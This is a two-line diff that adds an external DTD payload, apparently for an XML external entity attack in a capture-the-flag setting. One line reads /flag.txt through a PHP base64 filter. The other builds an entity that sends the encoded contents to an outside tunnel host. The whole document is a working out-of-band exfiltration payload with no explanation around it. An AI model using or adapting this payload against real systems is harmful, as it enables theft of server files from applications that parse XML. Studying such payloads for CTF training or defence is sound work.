@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://3c02574086d466.lhr.life/pwn.dtd?%data;'>">
